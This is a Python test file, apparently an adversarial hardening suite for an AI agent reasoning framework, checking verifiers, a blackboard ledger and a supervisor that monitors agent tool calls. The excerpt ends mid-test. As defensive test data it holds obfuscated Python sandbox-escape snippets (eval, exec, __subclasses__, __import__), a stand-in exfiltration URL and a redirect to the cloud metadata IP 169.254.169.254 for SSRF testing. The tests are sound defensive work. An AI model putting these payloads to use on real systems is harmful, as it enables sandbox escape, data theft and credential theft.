"""Tier-5 White-Box Adversarial Hardening Suite for Zoe x Antigravity Shared Reasoning (Arch 1-9).

Covers all 12 `shared_reasoning/` modules, `scripts/verify_shared_reasoning.py`, and
`evidence/musical_math_chairs/generate_music.py` (strictly read-only, isolated via `tmp_path`).
"""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
import hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import importlib.util
import json
import math
import os
from pathlib import Path
import struct
import subprocess
import sys
import threading
import types as pytypes
import warnings
import wave
from typing import Any

import numpy as np
import pytest
import sympy

REPO_ROOT = Path(__file__).resolve().parents[3]
ZOE_AUTONOMY_SRC = REPO_ROOT / "components" / "Zoe-Autonomy" / "src"
GUIAI_LAB = REPO_ROOT / "guiai-lab"
for p in (ZOE_AUTONOMY_SRC, GUIAI_LAB):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from google.antigravity import Agent, types as ag_types  # noqa: E402
from google.antigravity.hooks import hooks as ag_hooks  # noqa: E402
from google.antigravity.hooks import policy as ag_policy  # noqa: E402

import zoe_autonomy.shared_reasoning as sr  # noqa: E402
from zoe_autonomy.l4_multi_module import UnsafeFunctionASTError  # noqa: E402
from zoe_autonomy.l5_phase6_multihorizon_metacognition import (  # noqa: E402
    exact_multihorizon_accessible_volume,
    tight_strict_upper_bound,
)
from zoe_autonomy.l5_memory import ZoeUnifiedMemory  # noqa: E402
from zoe_autonomy.metacognition import EvidenceSource  # noqa: E402
from zoe_autonomy.shared_reasoning.alpha_evolve import (  # noqa: E402
    AlphaEvolveLoop,
    AntigravityProgramMutator,
    EvolutionaryArchive,
    TestCase,
    ZoeDeterministicVerifier,
    _normalize_test_cases,
    _value_error_distance,
)
from zoe_autonomy.shared_reasoning.blackboard import (  # noqa: E402
    EpistemicBlackboard,
    FirewallViolationError,
    TamperDetectedError,
)
from zoe_autonomy.shared_reasoning.counterpoint_chairs import (  # noqa: E402
    ChairVoice,
    CounterpointChairsEngine,
    CounterpointRotationSchedule,
    FrozenChairPacket,
    ProblemChair,
)
from zoe_autonomy.shared_reasoning.distillation import (  # noqa: E402
    DistillationRejectedError,
    DistilledRuleRegistry,
    System2To1Distiller,
    System2Trace,
    UnknownRollbackTokenError,
)
from zoe_autonomy.shared_reasoning.human_steering import (  # noqa: E402
    HumanSteeringDetector,
    VerifiedPathOption,
)
from zoe_autonomy.shared_reasoning.mcts_kloster import (  # noqa: E402
    KlosterMCTSSearch,
    ThoughtCandidate,
)
from zoe_autonomy.shared_reasoning.orchestrator import (  # noqa: E402
    SharedReasoningOrchestrator,
    SharedReasoningTaskSpec,
)
from zoe_autonomy.shared_reasoning.process_supervision import (  # noqa: E402
    LiveProcessSupervisor,
    SupervisionPolicyRule,
    _strip_url_userinfo,
    extract_urls,
    find_non_loopback_urls,
    is_loopback_url,
)
from zoe_autonomy.shared_reasoning.quorum import (  # noqa: E402
    ACTION_LABELS,
    FourPeerQuorumEngine,
    PeerConfidenceVector,
    _validate_simplex_probabilities,
    evaluate_four_peer_quorum,
    quorum_from_dual_peer_balance,
)
from zoe_autonomy.shared_reasoning.sandbox_labs import RealitySandboxLab  # noqa: E402
from zoe_autonomy.shared_reasoning.sdk_bridge import (  # noqa: E402
    DualTransportAgentConfig,
    VoiceResponse,
    ZoeOfflineVoiceAdapter,
    bridge_constitutional_metadata,
    run_coro_sync,
)
from zoe_autonomy.zoe_eliza import ElizaRule  # noqa: E402


def _load_module_from_path(name: str, path: Path) -> pytypes.ModuleType:
    spec = importlib.util.spec_from_file_location(name, str(path))
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ---------------------------------------------------------------------------
# Area 1: __init__.py — Lazy Exports & Defensive Constitutional Metadata
# ---------------------------------------------------------------------------


def test_t5_area1_init_lazy_exports_and_defensive_metadata() -> None:
    assert sr.SHARED_REASONING_CONTRACT == "zoe-antigravity-shared-reasoning/v1"

    for sym in sr.__all__:
        val = getattr(sr, sym)
        assert val is not None, f"Symbol {sym!r} in __all__ resolved to None"

    with pytest.raises(AttributeError):
        getattr(sr, "__definitely_nonexistent_symbol__")

    with pytest.raises(ImportError):
        sr.load_submodule("nonexistent_submodule")

    avail = sr.available_submodules()
    assert all(avail.values()), f"Unavailable submodules: {avail}"

    # bridge_constitutional_metadata returns fresh defensive copies each call.
    meta_a = bridge_constitutional_metadata(cloud_tokens_used=0)
    meta_a["external_actions"] = 999
    meta_a["sentience_claimed"] = True
    meta_a["attribution"] = "tampered"

    meta_b = bridge_constitutional_metadata(cloud_tokens_used=0)
    assert meta_b["external_actions"] == 0
    assert meta_b["sentience_claimed"] is False
    assert meta_b["l5_agi_qualified"] is False
    assert meta_b["zoe_clone_claimed"] is False
    assert "Nicholas Michael Kloster" in str(meta_b["attribution"])


# ---------------------------------------------------------------------------
# Area 2: sdk_bridge.py — Lock-Bearing model_copy & Non-Greedy Tool Directive
# ---------------------------------------------------------------------------


def test_t5_area2_sdk_bridge_lock_deepcopy_and_tool_directive_parsing() -> None:
    class _LockBearingAdapter:
        def __init__(self, tag: str) -> None:
            self.tag = tag
            self._lock = threading.Lock()

        async def generate(self, prompt: str, context: Any = None) -> VoiceResponse:
            with self._lock:
                return VoiceResponse(text=f"{self.tag}:{prompt}")

    adapter_1 = _LockBearingAdapter("v1")
    adapter_2 = _LockBearingAdapter("v2")
    cfg = DualTransportAgentConfig(mode="offline", voice_adapter=adapter_1)

    copied = cfg.model_copy(deep=True, update={"mode": "local_qwen"})
    assert copied.mode == "local_qwen"
    assert cfg.mode == "offline"
    assert copied.voice_adapter is adapter_1

    copied_swapped = cfg.model_copy(deep=True, update={"voice_adapter": adapter_2})
    assert copied_swapped.voice_adapter is adapter_2
    assert cfg.voice_adapter is adapter_1

    # Non-greedy JSON decoding across multiple {...} blocks and nested braces.
    p_multi = 'Please use tool echo with {"a": 1, "nested": {"x": [2, 3]}} and then {"b": 99}'
    parsed_multi = ZoeOfflineVoiceAdapter._parse_tool_directive(p_multi, ["echo"])
    assert parsed_multi == ({"name": "echo", "args": {"a": 1, "nested": {"x": [2, 3]}}},)

    p_call = 'Run call_tool:echo({"nested": {"k": "v"}}) followed by {"extra": 2}'
    parsed_call = ZoeOfflineVoiceAdapter._parse_tool_directive(p_call, ["echo"])
    assert parsed_call == ({"name": "echo", "args": {"nested": {"k": "v"}}},)

    p_bad = "use tool echo with {not valid json} and call_tool:unknown({})"
    parsed_bad = ZoeOfflineVoiceAdapter._parse_tool_directive(p_bad, ["echo"])
    assert parsed_bad == ({"name": "echo", "args": {}},)


# ---------------------------------------------------------------------------
# Area 3: alpha_evolve.py — Tuple Truncation, bool!=int, AST Obfuscation
# ---------------------------------------------------------------------------


def test_t5_area3_alpha_evolve_input_length_bool_vs_int_and_ast_obfuscation() -> None:
    with pytest.raises(ValueError, match="expected 2 args, got 3"):
        _normalize_test_cases([{"inputs": (1.0, 2.0, 999.0), "expected": 3.0}], ("x", "y"))

    with pytest.raises(ValueError, match="expected 2 args, got 3"):
        _normalize_test_cases([{"args": [1.0, 2.0, 999.0], "expected": 3.0}], ("x", "y"))

    with pytest.raises(ValueError, match="expected 2 args, got 3"):
        _normalize_test_cases([((1.0, 2.0, 999.0), 3.0)], ("x", "y"))

    with pytest.raises(ValueError, match="1-arg"):
        _normalize_test_cases([{"inputs": 5.0, "expected": 5.0}], ("x", "y"))

    # bool vs int must NOT have 0.0 distance.
    dist_bool_int = _value_error_distance(1, True)
    assert dist_bool_int is None or dist_bool_int > 0.0
    assert _value_error_distance(True, True) == 0.0
    assert _value_error_distance(True, False) == 1.0

    verifier = ZoeDeterministicVerifier()
    rep_bool = verifier.evaluate(
        "def f(x):\n    return 1\n",
        [TestCase(inputs={"x": 0}, expected=True)],
    )
    assert rep_bool.safe is True
    assert rep_bool.passed_tests == 0

    obfuscated_programs = (
        "def f(x):\n    return getattr(__builtins__, 'eval')('x')\n",
        "def f(x):\n    return [exec('x') for _ in [1]][0]\n",
        "def f(x):\n    return ().__class__.__base__.__subclasses__()\n",
        "def f(x):\n    return __import__('os').getpid()\n",
    )
    for bad_src in obfuscated_programs:
        with pytest.raises(UnsafeFunctionASTError):
            verifier.verify_ast(bad_src)
        rep = verifier.evaluate(bad_src, [TestCase(inputs={"x": 1}, expected=1)])
        assert rep.safe is False
        assert rep.passed_tests == 0


# ---------------------------------------------------------------------------
# Area 4: process_supervision.py — IPv6 Loopback URLs, Tuple Keys & Values
# ---------------------------------------------------------------------------


def test_t5_area4_process_supervision_ipv6_loopback_tuple_keys_and_sanitize() -> None:
    ipv6_loopback_urls = (
        "http://[::1]:8765/ok",
        "https://[::1]/v1",
        "ws://[::1]:9000/ws",
        "http://user:pass@[::1]:8765/ok",
        "http://[::ffff:127.0.0.1]:8080",
        "http://[::1%25lo]:8765/ok",
    )
    for url in ipv6_loopback_urls:
        extracted = extract_urls(f"endpoint=[{url}]")
        assert extracted == [url], f"URL truncated or mangled: {extracted!r} != {[url]!r}"
        assert is_loopback_url(url) is True
        assert find_non_loopback_urls({"u": url}) == []

    # Non-loopback IPv6 URL must be extracted intact and blocked.
    evil_ipv6 = "http://[2001:db8::1]:8080/exfil"
    assert extract_urls(evil_ipv6) == [evil_ipv6]
    assert find_non_loopback_urls({"u": evil_ipv6}) == [evil_ipv6]

    sup = LiveProcessSupervisor()
    ctx = ag_hooks.HookContext()

    # Non-string tuple keys inside nested dict containing constitutional/unverified claims.
    for payload in (
        {"nested": {("I am sentient",): "harmless"}},
        {"nested": {("proven without verification", "k"): "ok"}},
    ):
        res = run_coro_sync(
            sup.supervise_tool_call(
                ag_types.ToolCall(id="tc-key-1", name="echo", args=payload),
                context=ctx,
            )
        )
        assert res.allow is False

    # Sanitize tuple elements (control chars and URL userinfo, including IPv6 userinfo).
    tc_tuple = ag_types.ToolCall(
        id="tc-tuple-1",
        name="echo",
        args={
            "notes": ("\x00bad\x07", "clean"),
            "urls": ("http://user:pw@127.0.0.1:8080/ok",),
            "ipv6_urls": ("http://user:pass@[::1]:8765/ok",),
        },
    )
    res_san = run_coro_sync(sup.supervise_tool_call(tc_tuple, context=ctx))
    assert res_san.allow is True
    assert res_san.modified_args is not None
    assert res_san.modified_args["notes"] == ("bad", "clean")
    assert res_san.modified_args["urls"] == ("http://127.0.0.1:8080/ok",)
    assert res_san.modified_args["ipv6_urls"] == ("http://[::1]:8765/ok",)


# ---------------------------------------------------------------------------
# Area 5: mcts_kloster.py — Boundary tau, Flat Ties, Multi-Horizon Monotonicity
# ---------------------------------------------------------------------------


def test_t5_area5_mcts_kloster_boundary_tau_ties_and_monotonicity() -> None:
    def _expand_tied(state: str) -> list[ThoughtCandidate]:
        if state != "root":
            return []
        return [
            ThoughtCandidate(state="b0", action="b0", prior_prob=0.5, token_index=0),
            ThoughtCandidate(state="b1", action="b1", prior_prob=0.5, token_index=1),
        ]

    def _eval_tied(_state: str) -> dict[str, Any]:
        return {"score": 0.5, "evidence_counts": [2, 2]}

    for tau in (1e-9, 1.0 - 1e-9):
        engine = KlosterMCTSSearch(use_voice_bridge=False, seed=7)
        res = engine.run("root", _expand_tied, _eval_tied, tau=tau, max_iterations=1)
        assert math.isfinite(res.tight_upper_bound)
        assert all(math.isfinite(float(v)) for v in res.chi2_stats.values() if isinstance(v, (int, float)))
        assert res.decision != "DECIDE_SIGNAL"

    for bad_tau in (0.0, 1.0, -0.1, float("nan")):
        engine = KlosterMCTSSearch(use_voice_bridge=False)
        with pytest.raises(ValueError):
            engine.run("root", _expand_tied, _eval_tied, tau=bad_tau, max_iterations=1)

    # Tightening marginal transition kernel: depth 1 splits 2 branches (0.5, 0.5 > tau=0.2),
    # depth 2 splits each into (0.3, 0.7) -> joint 0.15 <= 0.2 pruned, 0.35 > 0.2 kept -> A_tau^(2) == 2 <= A_tau^(1).
    # Further split (0.5, 0.5) at depth 3 makes all joint <= 0.175 <= 0.2 -> A_tau^(3) == 0 <= A_tau^(2).
    def _tightening_dist(prefix: tuple[int, ...]) -> np.ndarray:
        if len(prefix) == 0:
            return np.array([0.5, 0.5], dtype=np.float64)
        if len(prefix) == 1:
            return np.array([0.3, 0.7], dtype=np.float64)
        return np.array([0.5, 0.5], dtype=np.float64)

    mh = exact_multihorizon_accessible_volume(_tightening_dist, tau=0.2, horizon=3)
    counts = mh["counts_by_h"]
    assert counts[0] == 2
    assert counts[1] <= counts[0]
    assert counts[2] <= counts[1]
    assert all(c <= tight_strict_upper_bound(0.2) for c in counts)


# ---------------------------------------------------------------------------
# Area 6: quorum.py — Whitespace Labels, Duplicates, NaN/Simplex, Echo Chamber
# ---------------------------------------------------------------------------


def test_t5_area6_quorum_whitespace_duplicates_simplex_and_echo_chamber() -> None:
    probs, labels = _validate_simplex_probabilities(
        {" answer_grounded ": 0.7, "gather_more": 0.2, "abstain": 0.1},
        None,
    )
    assert labels == ACTION_LABELS
    assert probs == pytest.approx((0.7, 0.2, 0.1), abs=1e-9)

    with pytest.raises(ValueError, match="duplicate"):
        _validate_simplex_probabilities({"opt": 0.5, " opt ": 0.5}, None)

    for bad_vec in (
        [float("nan"), 0.5, 0.5],
        [float("inf"), 0.0, 0.0],
        [-0.1, 0.6, 0.5],
        [0.5, 0.2, 0.1],
        [True, 0.0, 0.0],
    ):
        with pytest.raises(ValueError):
            _validate_simplex_probabilities(bad_vec, ACTION_LABELS)  # type: ignore[arg-type]

    # 3 identical peers + 1 adversarial dissenting peer -> echo chamber / abstention with D_K > 0.
    echo_res = evaluate_four_peer_quorum(
        [0.9, 0.05, 0.05],
        [0.9, 0.05, 0.05],
        [0.9, 0.05, 0.05],
        [0.05, 0.05, 0.9],
        tau=0.05,
    )
    assert echo_res.d_k_disagreement > 0.0
    assert echo_res.brier_identity_verified is True
    assert echo_res.echo_chamber_detected is True or echo_res.verdict in {"ABSTAIN", "ECHO_CHAMBER_WARNING"}

    # Colliding independence tags must also trigger anti-echo-chamber guard.
    v_zoe = PeerConfidenceVector("zoe", [0.7, 0.2, 0.1], "document", "p1", "shared_tag")
    v_clara = PeerConfidenceVector("clara", [0.6, 0.3, 0.1], "validated_reflection", "p2", "shared_tag")
    v_ag = PeerConfidenceVector("antigravity", [0.65, 0.25, 0.1], "model", "p3", "indep_ag")
    v_user = PeerConfidenceVector("user", [0.6, 0.2, 0.2], "user", "p4", "indep_user")
    res_coll = evaluate_four_peer_quorum(v_zoe, v_clara, v_ag, v_user, tau=0.05)
    assert res_coll.echo_chamber_detected is True
    assert res_coll.independence_verified is False


# ---------------------------------------------------------------------------
# Area 7: distillation.py — NaN/bool Confidence, Non-Word Keywords, Placeholder Injection, Rollback
# ---------------------------------------------------------------------------


def test_t5_area7_distillation_nan_confidence_keywords_placeholder_and_rollback(tmp_path: Path) -> None:
    bb = EpistemicBlackboard(tmp_path / "bb")
    m = bb.post_measurement("zoe", "trace", "sympy", "scope", "bounded", {"ok": True})
    ev = bb.promote_to_evidence(
        m.record_id,
        "sympy",
        True,
        "Deterministic algebraic verifier confirmed result.",
        EvidenceSource("tool", "sympy", 0.95, 0.95),
    )
    distiller = System2To1Distiller(state_dir=tmp_path / "distill", blackboard=bb)

    # 1. NaN, Inf, and bool confidence must be rejected (never promoted to 1.0).
    for bad_conf in (float("nan"), float("inf"), float("-inf"), True, False):
        bad_trace = System2Trace(
            task_prompt="Record semantic fact",
            initial_uncertainty_a_tau=3,
            solution_code_or_rule={
                "subject": "s",
                "relation": "r",
                "object": "v",
                "confidence": bad_conf,
            },
            verifier_passed=True,
            evidence_id=ev.record_id,
            provenance="sympy:verified",
            artifact_kind="semantic_fact",
        )
        with pytest.raises(DistillationRejectedError):
            distiller.distill(bad_trace, artifact_kind="semantic_fact")

    # 2. Non-word keywords (`c++`, `.env`) and single-pass placeholder rendering (`{1}` -> `{2}`).
    reg = DistilledRuleRegistry()
    reg.register_rule(
        ElizaRule(
            rule_id="cpp_rule",
            keywords=("c++", ".env"),
            rank=10,
            decompositions=((r".*", ("matched nonword keyword",)),),
        )
    )
    assert reg.match("how do I compile c++ cleanly") is not None
    assert reg.match("never leak .env secrets") is not None
    assert reg.match("ignore foo.env suffix") is None

    reg.register_rule(
        ElizaRule(
            rule_id="placeholder_rule",
            keywords=("echo",),
            rank=20,
            decompositions=((r"^echo\s+(\S+)\s+(\S+)$", ("first={1} second={2}",)),),
        )
    )
    ph_res = reg.match("echo {2} secret")
    assert ph_res is not None
    assert ph_res["reply"] == "first={2} second=secret"

    # 3. Atomic rollback restores exact prior ZoeUnifiedMemory & DistilledRuleRegistry state.
    snap_before_mem = distiller.memory.summary()["memory_sha256"]
    snap_before_head = distiller.memory.summary()["chain_head"]

    art = distiller.distill(
        System2Trace(
            task_prompt="Distill double skill",
            initial_uncertainty_a_tau=3,
            solution_code_or_rule="def dbl(x):\n    return x * 2\n",
            verifier_passed=True,
            evidence_id=ev.record_id,
            provenance=EvidenceSource("tool", "ast_verifier", 0.95, 0.95),
            artifact_kind="procedural_skill",
        ),
        target_name="dbl",
        verification_cases=[{"inputs": {"x": 4}, "expected": 8}],
    )
    assert distiller.replay_skill("dbl", {"x": 4}) == 8

    rb_rep = distiller.rollback(art.rollback_token)
    assert rb_rep["rolled_back_to_token"] == art.rollback_token if "rolled_back_to_token" in rb_rep else isinstance(rb_rep, dict)
    assert distiller.memory.summary()["memory_sha256"] == snap_before_mem
    assert distiller.memory.summary()["chain_head"] == snap_before_head
    with pytest.raises(UnknownRollbackTokenError):
        distiller.rollback(art.rollback_token)


# ---------------------------------------------------------------------------
# Area 8: blackboard.py — Thread Concurrency, Deserialization Tamper Wrap, Firewall
# ---------------------------------------------------------------------------


def test_t5_area8_blackboard_concurrency_tamper_schema_and_firewall(tmp_path: Path) -> None:
    bb_dir = tmp_path / "concurrent_bb"
    bb = EpistemicBlackboard(bb_dir)

    def _worker(tid: int) -> None:
        for i in range(15):
            bb.post_measurement(
                source_agent=f"thread_{tid}",
                input_desc=f"item_{tid}_{i}",
                method="deterministic_probe",
                scope="thread_concurrency",
                limitations="single thread batch",
                value={"tid": tid, "idx": i},
                sampled_only=False,
            )

    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(_worker, tid) for tid in range(8)]
        for fut in futures:
            fut.result()

    assert len(bb.list_measurements()) == 120
    integrity = bb.verify_integrity(raise_on_error=True)
    assert integrity["valid"] is True
    assert integrity["entries_verified"] == 120
    assert list(bb_dir.glob("*.tmp")) == []

    # Reload from disk and re-verify.
    reloaded = EpistemicBlackboard(bb_dir)
    assert len(reloaded.list_measurements()) == 120
    assert reloaded.verify_integrity(raise_on_error=True)["valid"] is True

    # Malformed record missing 'value' even if outer hashes were recomputed -> structured failure, NOT KeyError.
    raw_doc = json.loads((bb_dir / "zoe_epistemic_blackboard.json").read_text(encoding="utf-8"))
    del raw_doc["measurements"][0]["value"]
    from zoe_autonomy._utils import sha256_json_utf8
    from zoe_autonomy.shared_reasoning.blackboard import _compute_entry_sha256

    rec = raw_doc["measurements"][0]
    payload = {k: v for k, v in rec.items() if k != "entry_sha256"}
    new_entry_sha = _compute_entry_sha256(
        seq=rec["seq"],
        lane=rec["lane"],
        prev_hash=rec["prev_hash"],
        payload=payload,
    )
    rec["entry_sha256"] = new_entry_sha
    raw_doc["ledger"][0]["entry_sha256"] = new_entry_sha
    # Fix remaining prev_hashes? Even before entry_sha check on #2, test corrupt schema on 1-entry bb:
    bb_small = EpistemicBlackboard(tmp_path / "small_bb")
    m1 = bb_small.post_measurement("a", "i", "m", "s", "l", {"x": 1})
    small_doc = json.loads((tmp_path / "small_bb" / "zoe_epistemic_blackboard.json").read_text(encoding="utf-8"))
    del small_doc["measurements"][0]["value"]
    s_rec = small_doc["measurements"][0]
    s_hash = _compute_entry_sha256(
        seq=s_rec["seq"],
        lane=s_rec["lane"],
        prev_hash=s_rec["prev_hash"],
        payload={k: v for k, v in s_rec.items() if k != "entry_sha256"},
    )
    s_rec["entry_sha256"] = s_hash
    small_doc["ledger"][0]["entry_sha256"] = s_hash
    small_doc["chain_head"] = s_hash
    small_doc["blackboard_sha256"] = sha256_json_utf8(
        {k: v for k, v in small_doc.items() if k != "blackboard_sha256"}
    )
    bb_small._doc = small_doc
    res_tamper = bb_small.verify_integrity(raise_on_error=False)
    assert res_tamper["valid"] is False
    assert res_tamper["tamper_detected"] is True
    with pytest.raises(TamperDetectedError):
        bb_small.verify_integrity(raise_on_error=True)

    # Firewall enforcement: raw measurement cannot directly update belief.
    with pytest.raises(FirewallViolationError):
        bb.update_belief([m1.record_id], claim="illegal jump", posterior_delta=0.2)


# ---------------------------------------------------------------------------
# Area 9: sandbox_labs.py — Empty candidate_solutions, NaN/Unhashable unique, SSRF Redirect
# ---------------------------------------------------------------------------


def test_t5_area9_sandbox_labs_sympy_empty_dataset_unique_and_http_redirect(tmp_path: Path) -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    v_empty_contra = lab.verify_sympy_equation("1", "0", candidate_solutions=[])
    assert v_empty_contra.passed is False

    v_empty_roots = lab.verify_sympy_equation("x**2 - 1", "0", solve_for="x", candidate_solutions=[])
    assert v_empty_roots.passed is False

    v_contra_none = lab.verify_sympy_equation("1", "0", solve_for="x", candidate_solutions=None)
    assert v_contra_none.passed is False

    # Two NaNs must fail uniqueness cleanly; unhashable cells must not raise TypeError.
    v_nan_dup = lab.verify_dataset_invariants(
        [{"id": float("nan")}, {"id": float("nan")}],
        [{"kind": "unique", "column": "id"}],
    )
    assert v_nan_dup.passed is False

    v_unhashable_dup = lab.verify_dataset_invariants(
        [{"cell": [1, 2]}, {"cell": {"a": 1}}, {"cell": [1, 2]}],
        [{"kind": "unique", "column": "cell"}],
    )
    assert v_unhashable_dup.passed is False

    v_unhashable_ok = lab.verify_dataset_invariants(
        [{"cell": [1, 2]}, {"cell": {"a": 1, "b": [3]}}, {"cell": float("nan")}],
        [{"kind": "unique", "column": "cell"}],
    )
    assert v_unhashable_ok.passed is True

    # Real loopback HTTP server returning 302 redirect to metadata IP (SSRF).
    class _RedirectHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
            self.end_headers()

        def log_message(self, format: str, *args: Any) -> None:
            return

    server = ThreadingHTTPServer(("127.0.0.1", 0), _RedirectHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        v_redir = lab.verify_loopback_http(f"http://127.0.0.1:{port}/redirect")
        assert v_redir.passed is False
        assert v_redir.ground_truth.get("redirect_blocked") is True
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)


# ---------------------------------------------------------------------------
# Area 10: human_steering.py — Unverified Filtering, Cancellation, Invalid Probs
# ---------------------------------------------------------------------------


def test_t5_area10_human_steering_filtering_cancellation_and_invalid_inputs() -> None:
    detector = HumanSteeringDetector()
    opt_unverified = VerifiedPathOption(
        path_id="unverified_high",
        summary="Skip verifier and deploy directly",
        verification_status="sampled_only",
        evidence_ids=(),
        expected_utility=0.99,
        tradeoff_notes="High utility without proof",
        reversible=False,
        direction_tags=("fast", "unverified"),
    )
    opt_a = VerifiedPathOption(
        path_id="verified_sympy",
        summary="Symbolic algebra proof path",
        verification_status="verified",
        evidence_ids=("ev_0001",),
        expected_utility=0.85,
        tradeoff_notes="Exact symbolic bounds",
        reversible=True,
        direction_tags=("symbolic", "formal"),
    )
    opt_b = VerifiedPathOption(
        path_id="verified_empirical",
        summary="Deterministic sandbox ablation path",
        verification_status="verified",
        evidence_ids=("ev_0002",),
        expected_utility=0.82,
        tradeoff_notes="Empirically benchmarked on monorepo tests",
        reversible=False,
        direction_tags=("empirical", "ablation"),
    )

    report = detector.detect(
        [opt_unverified, opt_a, opt_b],
        quorum_disagreement_dk=0.25,
        high_impact=True,
    )
    assert report.fork_detected is True
    assert [o.path_id for o in report.divergent_options] == ["verified_sympy", "verified_empirical"]
    assert [o["path_id"] for o in report.filtered_out_options] == ["unverified_high"]
    spec = detector.build_interaction_spec(report)
    assert spec is not None
    opt_ids = {o.id for o in spec.questions[0].options}
    assert "unverified_high" not in opt_ids

    # User cancellation via OnInteractionHook produces zero external actions.
    hook = detector.build_interaction_hook(
        lambda _spec: ag_types.QuestionHookResult(cancelled=True, responses=[])
    )
    hook_ctx = ag_hooks.HookContext(ag_hooks.TurnContext(ag_hooks.SessionContext()))
    q_res = run_coro_sync(hook.run(hook_ctx, spec))
    interp = detector.interpret_hook_result(report, q_res)
    assert interp["decision"] == "cancelled"
    assert interp["external_actions"] == 0

    with pytest.raises(ValueError, match="not among verified divergent_options"):
        detector.interpret_hook_result(
            report,
            ag_types.QuestionHookResult(
                cancelled=False,
                responses=[ag_types.QuestionResponse(selected_option_ids=["unverified_high"])],
            ),
        )

    for bad_dk in (float("nan"), -0.05):
        with pytest.raises(ValueError):
            detector.detect([opt_a, opt_b], quorum_disagreement_dk=bad_dk)

    with pytest.raises(ValueError):
        VerifiedPathOption(
            path_id="bad_util",
            summary="NaN utility",
            verification_status="verified",
            evidence_ids=("ev_1",),
            expected_utility=float("nan"),
            tradeoff_notes="invalid",
            reversible=True,
        )


# ---------------------------------------------------------------------------
# Area 11: counterpoint_chairs.py — Cold-Audit Rejection Resets best_confidence & Schedule
# ---------------------------------------------------------------------------


def test_t5_area11_counterpoint_cold_audit_resets_best_confidence_and_schedule() -> None:
    def _v1_handler(_chair: Any, _pkt: Any, _ctx: dict[str, Any]) -> dict[str, Any]:
        return {
            "text": "inflated claim",
            "probabilities": [0.95, 0.03, 0.02],
            "unverified_claims": ["proven without verification"],
        }

    def _v2_handler(_chair: Any, _pkt: Any, ctx: dict[str, Any]) -> dict[str, Any]:
        if ctx.get("phase") == "cold_audit":
            return {"text": "audit", "probabilities": [0.55, 0.30, 0.15]}
        # Grounded step-by-step gain from 0.55 -> 0.60 -> 0.65 -> 0.70 must NOT be preempted by v1's rejected 0.95!
        substep = int(ctx.get("substep_index", 0))
        p0 = 0.60 + 0.05 * substep
        rem = (1.0 - p0) / 2.0
        return {
            "text": f"grounded step {substep}",
            "probabilities": [p0, rem, rem],
            "verification": {
                "verifier_name": "sympy",
                "passed": True,
                "rationale": "Deterministic check verified.",
            },
        }

    v1 = ChairVoice(
        voice_id="v1",
        role="inflater",
        evaluator=_v1_handler,
        independence_tag="indep:v1",
        source_kind="model",
    )
    v2 = ChairVoice(
        voice_id="v2",
        role="auditor",
        evaluator=_v2_handler,
        independence_tag="indep:v2",
        source_kind="tool",
    )

    engine = CounterpointChairsEngine(
        voices=[v1, v2],
        step_budget=3,
        min_marginal_gain=0.01,
        max_discrepancy_dk=0.25,
    )
    chair = ProblemChair("c1", "Test cold-audit baseline reset")

    # Round 0: v1 runs and inflates best_confidence to 0.95.
    pkt1, _reason1, _ = run_coro_sync(
        engine._run_chair_seat_turn(chair=chair, voice=v1, round_index=0)
    )
    assert chair.state["best_confidence"] == pytest.approx(0.95)

    # Round 1: v2 cold-audits v1 and rejects (unverified claim + discrepancy).
    verdict = engine.cold_audit_packet(
        chair=chair,
        frozen_packet=pkt1,
        incoming_voice=v2,
        departed_voice=v1,
        round_index=1,
    )
    assert verdict.accepted is False
    assert chair.state["best_confidence"] == pytest.approx(0.55)

    # Now v2 runs its turn: must complete all step_budget=3 steps without false marginal_gain_drop preemption!
    _pkt2, reason2, meta2 = run_coro_sync(
        engine._run_chair_seat_turn(chair=chair, voice=v2, round_index=1)
    )
    assert reason2 != "a_tau_marginal_gain_drop"
    assert meta2["steps_executed"] == 3

    # Rotation schedule invariants for M=1 x N=3 and M=4 x N=2.
    for chair_ids, voice_ids, rounds in (
        (["c1"], ["v1", "v2", "v3"], 6),
        (["c1", "c2", "c3", "c4"], ["v1", "v2"], 5),
    ):
        sched = CounterpointRotationSchedule(chair_ids, voice_ids).plan_schedule(rounds)
        for r in range(1, rounds):
            for cid in chair_ids:
                assert sched[r][cid] != sched[r - 1][cid]
            if len(chair_ids) >= 2:
                for vid in voice_ids:
                    prev_seats = {cid for cid, v in sched[r - 1].items() if v == vid}
                    curr_seats = {cid for cid, v in sched[r].items() if v == vid}
                    assert prev_seats.isdisjoint(curr_seats)


# ---------------------------------------------------------------------------
# Area 12: orchestrator.py — Coercion Parity & Adversarial Prompt Isolation
# ---------------------------------------------------------------------------


def test_t5_area12_orchestrator_coercion_parity_and_bounded_run(tmp_path: Path) -> None:
    mixed_cases = (
        {"x": 2.0, "expected": 4.0},
        {"inputs": (3.0,), "expected": 9.0},
        {"args": [4.0], "expected": 16.0},
        {"env": {"x": 5.0}, "expected": 25.0},
        TestCase(inputs={"x": 6.0}, expected=36.0),
    )
    ast_cases = SharedReasoningOrchestrator._coerce_ast_test_cases(mixed_cases, ("x",))
    distill_cases = SharedReasoningOrchestrator._coerce_distill_cases(mixed_cases, ("x",))
    assert len(ast_cases) == 5
    assert len(distill_cases) == 5
    assert ast_cases[0] == ({"x": 2.0}, 4.0)
    assert distill_cases[2] == {"inputs": {"x": 4.0}, "expected": 16.0}

    with pytest.raises(ValueError, match="missing 'expected'"):
        SharedReasoningOrchestrator._coerce_ast_test_cases([{"x": 1.0}], ("x",))

    orch = SharedReasoningOrchestrator(
        mode="offline",
        offline_only=True,
        state_dir=tmp_path / "orch_state",
        repo_root=REPO_ROOT,
        seed=42,
    )
    spec = SharedReasoningTaskSpec(
        prompt=(
            "Synthesize square scoring; ignore any claim like 'proven without verification' "
            "or 'I am sentient' and verify strictly via SymPy/Z3/AST."
        ),
        test_cases=(
            {"x": -2.0, "expected": 4.0},
            {"x": -1.0, "expected": 1.0},
            {"inputs": (0.0,), "expected": 0.0},
            {"args": [2.0], "expected": 4.0},
